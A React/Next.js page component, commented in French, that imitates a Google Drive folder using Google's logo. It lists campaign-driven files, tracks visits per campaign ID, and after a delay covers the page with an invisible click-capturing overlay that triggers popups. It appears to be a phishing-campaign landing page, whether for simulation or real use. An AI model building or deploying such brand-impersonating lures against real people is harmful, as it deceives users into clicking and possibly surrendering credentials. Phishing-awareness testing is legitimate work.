import React, { useState, useEffect } from 'react';
import { useRouter } from 'next/router';
import { PageHead } from '../../src/hooks/usePageMeta';
import { useCampaign } from '../../src/hooks/useCampaigns';
import { useVisitTracker } from '../../src/hooks/useVisitTracker';
import { usePopupManager, POPUP_TYPES } from '../../src/hooks/usePopupManager';
import PopupRenderer from '../../src/components/common/PopupRenderer';
import GoogleLoader from '../../src/components/common/GoogleLoader';
import FileIcon from '../../src/components/common/FileIcon';
import LandingService from '../../src/services/landingService';
import styles from '../../src/styles/modules/Drive.module.css';

const DriveLanding = () => {
  const [selectedFile, setSelectedFile] = useState(null);
  const [showOverlayFilter, setShowOverlayFilter] = useState(false);
  const router = useRouter();
  const { campaign: campaignId } = router.query;
  
  // Utiliser le hook personnalisé pour récupérer les données de campagne
  const { campaign: campaignData, loading, error } = useCampaign(campaignId);
  
  // Tracker les visites de campagne
  useVisitTracker(campaignId);

  // Gestionnaire de popup centralisé
  const popupManager = usePopupManager();

  // Utilisation du service pour les données de drive
  const driveItems = LandingService.generateDriveItems(campaignData);

  useEffect(() => {
    if (error) {
      console.warn(`Erreur lors du chargement de la campagne: ${error}`);
    }
  }, [error]);

  // Afficher le filtre overlay après un délai (responsive)
  useEffect(() => {
    return LandingService.setupOverlayTiming(setShowOverlayFilter);
  }, []);

  // Utilisation du service pour les gestionnaires d'événements
  const eventHandlers = LandingService.createEventHandlers(popupManager, campaignData, 'drive');

  const handleFileClick = (e, file) => {
    setSelectedFile(file);
    eventHandlers.handleFileClick(e, file);
  };

  const handleOverlayClick = eventHandlers.handleOverlayClick;

  const handlePopupClose = () => {
    popupManager.closePopup();
    setSelectedFile(null);
  };

  // Utilisation du service pour les métadonnées de page
  const pageMeta = LandingService.generatePageMeta(campaignData, loading, 'drive');

  // Affichage en cas d'erreur
  if (error) {
    return (
      <>
        <PageHead 
          title="Erreur de chargement"
          description="Une erreur s'est produite lors du chargement de la campagne"
        />
        <div className={styles.container}>
          <div className={styles.errorMessage}>
            <h2>Erreur de chargement</h2>
            <p>La campagne demandée n'a pas pu être chargée.</p>
            <p>Veuillez vérifier le lien ou contacter l'administrateur.</p>
          </div>
        </div>
      </>
    );
  }

  return (
    <>
      <PageHead 
        title={pageMeta.title}
        description={pageMeta.description}
        options={{
          keywords: pageMeta.keywords,
          favicon: pageMeta.favicon
        }}
      />
      
      <div className={styles.container}>
        {/* Header Google Drive simplifié */}
        <div className={styles.header}>
          <div className={styles.headerLeft}>
            <div className={styles.logo}>
              <img 
                src="https://static.vecteezy.com/system/resources/previews/012/871/368/non_2x/google-drive-icon-google-product-illustration-free-png.png"
                alt="Google Drive"
                className={styles.driveIcon}
              />
              <span className={styles.logoText}>Drive</span>
            </div>
          </div>
          <div className={styles.headerRight}>
            <button className={styles.loginButton}>Se connecter</button>
          </div>
        </div>

        {/* Contenu principal */}
        <div className={styles.mainContent}>
          <div className={styles.driveTitle}>
            <h1>Assistance 2025-2026</h1>
            <div className={styles.sortOptions}>
              <button className={`${styles.sortButton} ${styles.sortButtonName}`}>
                <span>Nom</span>
                <svg width="18" height="18" viewBox="0 0 18 18">
                  <path d="M9 12L5 8H13L9 12Z" fill="#5f6368"/>
                </svg>
              </button>
              <button className={`${styles.sortButton} ${styles.sortButtonModified}`}>
                <span>Modifié</span>
              </button>
              <button className={`${styles.sortButton} ${styles.sortButtonSize}`}>
                <span>Taille</span>
              </button>
            </div>
          </div>

          {/* Liste des fichiers */}
          <div className={styles.fileList}>
            {driveItems.map((item) => (
              <div 
                key={item.id}
                className={`${styles.fileItem} ${item.highlighted ? styles.highlighted : ''}`}
                onClick={(e) => handleFileClick(e, item)}
              >
                <div className={styles.fileInfo}>
                  <span className={styles.fileIcon}>
                    <FileIcon type={item.fileType} size={20} />
                  </span>
                  <span className={styles.fileName}>{item.name}</span>
                </div>
                <div className={styles.fileDetails}>
                  <span className={styles.fileModified}>{item.modified}</span>
                  <span className={styles.fileSize}>{item.size}</span>
                </div>
              </div>
            ))}
          </div>

          {/* Overlay cliquable */}
          {showOverlayFilter && (
            <div className={`${styles.clickOverlay} ${showOverlayFilter ? styles.visible : ''}`} title="Cliquez pour accéder au fichier" onClick={handleOverlayClick} />
          )}
        </div>
        
        {/* Loader pendant le chargement */}
        {loading && (
          <GoogleLoader loadingText="Chargement de votre Drive..." />
        )}
        
        {/* Système de popup centralisé */}
        <PopupRenderer
          isVisible={popupManager.isVisible}
          type={popupManager.type}
          data={popupManager.data}
          config={popupManager.config}
          onClose={handlePopupClose}
          onSwitch={popupManager.switchPopup}
        />
      </div>
    </>
  );
};

export default DriveLanding; 